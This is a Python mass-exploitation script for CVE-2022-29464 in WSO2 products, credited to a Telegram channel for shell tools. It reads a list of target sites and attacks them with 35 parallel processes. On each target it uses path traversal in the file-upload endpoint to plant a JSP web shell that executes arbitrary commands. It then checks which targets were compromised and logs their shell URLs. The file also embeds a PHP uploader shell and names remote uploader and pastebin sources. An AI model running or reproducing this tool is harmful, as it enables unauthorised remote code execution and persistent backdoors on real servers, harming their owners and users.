# CVE/Info:    2022-29464 WSO2 RCE Vulnerability
# Coded BY JEX Coder  => T.me/ShellTools
import requests
import sys
from multiprocessing import Pool
from os import system, name

UploaderSource = 'https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php'
pasteBin = 'https://pastebin.com/raw/y46Km13C'
shell = '''<title>Vuln!! patch it Now!</title><?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; }}?>'''
shellJsp = """Vuln!! patch it Now!<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>"""

def clear():
    linux = 'clear'
    windows = 'cls'
    system([linux, windows][name == 'nt'])


def banner():
    sssss = r'''
                        Coded BY JEX Coder [VIP]
                  ██╗    ██╗███████╗ ██████╗ ██████╗ 
                  ██║    ██║██╔════╝██╔═══██╗╚════██╗
                  ██║ █╗ ██║███████╗██║   ██║ █████╔╝
                  ██║███╗██║╚════██║██║   ██║██╔═══╝ 
                  ╚███╔███╔╝███████║╚██████╔╝███████╗
                   ╚══╝╚══╝ ╚══════╝ ╚═════╝ ╚══════╝
                 WSO2 Remote Code Execution - CVE-2022-29464
             
                           T.me/ShellTools                                      

    
    '''
    print(sssss)


def Exploit_CVE_2022_29464(url):
    if str(url).startswith('http://'):
        url = url.replace('http://', '')
    elif str(url).startswith('https://'):
        url = url.replace('https://', '')

    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/vuln.jsp": shellJsp}
    try:
        requests.post('http://{}/fileupload/toolsAny'.format(url), files=files, verify=False)
        check = requests.get('http://{}/authenticationendpoint/vuln.jsp'.format(url), timeout=7).content
        if 'Vuln!!' in check:
            print(' {} EXPLOITED> !~~~'.format(url))
            open('shell.txt', 'a').write('{}/authenticationendpoint/vuln.jsp\n'.format(url))
        else:
            print(' {} NOT EXPLOITED!'.format(url))
    except:
        print(' {} NOT Request sent!'.format(url))



if __name__ == '__main__':
    try:
        clear()
        banner()
        sites = open(sys.argv[1], 'r').read().splitlines()
        p = Pool(35)
        p.map(Exploit_CVE_2022_29464, sites)
    except:
        clear()
        banner()
        print('     usage: python {} sites.txt'.format(sys.argv[0]))
        sys.exit()